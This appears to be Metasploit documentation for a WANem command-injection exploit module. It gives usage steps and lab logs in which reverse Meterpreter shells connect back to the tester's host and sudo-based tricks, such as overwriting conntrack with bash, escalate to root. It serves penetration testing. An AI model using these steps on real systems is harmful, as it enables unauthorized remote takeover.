## Description

  This module exploits a command injection vulnerability in the WANalyzer
  component of WAN Emulator (WANem) versions 2.0 to 3.0 Beta 2. The
  `result.php` script does not require authentication and calls `shell_exec()`
  with user supplied data from the `pc` parameter resulting in arbitrary
  command execution as the `www-data` user.


## Vulnerable Application

  [WANem](http://wanem.sourceforge.net/) is a Wide Area Network Emulator, meant to provide a real experience of a Wide Area Network/Internet, during application development / testing over a LAN environment.

  This module has been tested successfully on WANem versions 2.0, 2.3 and 3.0 Beta 2.

  ISOs are available here:

  * https://sourceforge.net/projects/wanem/files/WANem/


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/linux/http/wanem_exec`
  3. Do: `set RHOST [IP]`
  4. Do: `set LHOST [IP]`
  5. Do: `set TARGET [TARGET]`
  6. Do: `run`
  7. You should get a session


## Scenarios

### WANem 2.0
  
  ```
  msf5 > use exploit/linux/http/wanem_exec 
  msf5 exploit(linux/http/wanem_exec) > set rhost 172.16.191.180
  rhost => 172.16.191.180
  msf5 exploit(linux/http/wanem_exec) > set target 0
  target => 0
  msf5 exploit(linux/http/wanem_exec) > check
  [*] 172.16.191.180:80 The target service is running, but could not be validated.
  msf5 exploit(linux/http/wanem_exec) > run
  [*] Exploit running as background job 0.
  
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [*] Sending stage (857352 bytes) to 172.16.191.180
  msf5 exploit(linux/http/wanem_exec) > [*] Meterpreter session 1 opened (172.16.191.188:4444 -> 172.16.191.180:40592) at 2018-03-11 08:21:35 -0400
  
  msf5 exploit(linux/http/wanem_exec) > 
  [*] Command Stager progress - 100.00% done (1246/1246 bytes)
  
  msf5 exploit(linux/http/wanem_exec) > sessions -i 1
  [*] Starting interaction with 1...
  
  meterpreter > getuid
  Server username: uid=33, gid=33, euid=33, egid=33
  meterpreter > shell
  Process 11490 created.
  Channel 1 created.
  /home/perc/dosu /bin/sh
  id
  uid=0(root) gid=33(www-data) groups=33(www-data)
  ^C
  Terminate channel 1? [y/N]  y
  meterpreter > 
  ```
  
### WANem 2.3
  
  ```
  msf5 exploit(linux/http/wanem_exec) > set rhost 172.16.191.176
  rhost => 172.16.191.176
  msf5 exploit(linux/http/wanem_exec) > set target 0
  target => 0
  msf5 exploit(linux/http/wanem_exec) > check
  [*] 172.16.191.176:80 The target service is running, but could not be validated.
  msf5 exploit(linux/http/wanem_exec) > run
  [*] Exploit running as background job 1.
  
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [*] Sending stage (857352 bytes) to 172.16.191.176
  msf5 exploit(linux/http/wanem_exec) > [*] Meterpreter session 2 opened (172.16.191.188:4444 -> 172.16.191.176:39300) at 2018-03-11 08:24:07 -0400
  
  msf5 exploit(linux/http/wanem_exec) > 
  [*] Command Stager progress - 100.00% done (1246/1246 bytes)
  
  msf5 exploit(linux/http/wanem_exec) > sessions -i 2
  [*] Starting interaction with 2...
  
  meterpreter > getuid
  Server username: uid=33, gid=33, euid=33, egid=33
  meterpreter > shell
  Process 23385 created.
  Channel 1 created.
  sudo /bin/sh
  id
  uid=0(root) gid=0(root) groups=0(root)
  ^C
  Terminate channel 1? [y/N]  y
  meterpreter > 
  ```
  
  
### WANem 3.0 Beta 2
  
  ```
  msf5 exploit(linux/http/wanem_exec) > set rhost 172.16.191.177
  rhost => 172.16.191.177
  msf5 exploit(linux/http/wanem_exec) > set target 1
  target => 1
  msf5 exploit(linux/http/wanem_exec) > check
  [+] 172.16.191.177:80 The target is vulnerable.
  msf5 exploit(linux/http/wanem_exec) > run
  [*] Exploit running as background job 2.
  
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [*] Sending stage (857352 bytes) to 172.16.191.177
  msf5 exploit(linux/http/wanem_exec) > [*] Meterpreter session 3 opened (172.16.191.188:4444 -> 172.16.191.177:51022) at 2018-03-11 08:25:31 -0400
  
  msf5 exploit(linux/http/wanem_exec) > 
  [*] Command Stager progress - 100.00% done (1246/1246 bytes)
  
  msf5 exploit(linux/http/wanem_exec) > sessions -i 3
  [*] Starting interaction with 3...
  
  meterpreter > getuid
  Server username: uid=33, gid=33, euid=33, egid=33
  meterpreter > shell
  Process 9643 created.
  Channel 1 created.
  cp /bin/bash /tmp/bash
  sudo /bin/mv /tmp/bash /usr/sbin/conntrack
  sudo /usr/sbin/conntrack
  id
  uid=0(root) gid=0(root) groups=0(root)
  ^C
  Terminate channel 1? [y/N]  y
  ```

